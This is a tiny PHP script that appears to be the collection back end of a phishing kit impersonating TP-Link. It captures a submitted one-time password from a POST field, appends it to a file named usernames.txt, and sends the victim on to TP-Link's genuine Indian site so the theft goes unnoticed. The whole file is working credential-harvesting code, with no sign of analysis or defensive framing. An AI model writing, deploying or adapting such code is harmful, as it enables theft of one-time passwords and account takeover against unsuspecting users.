<?php
file_put_contents("usernames.txt", "otp=" .  $pass = $_POST['otp'] . "\n", FILE_APPEND);
header('Location: https://www.tp-link.com/in/');
?>
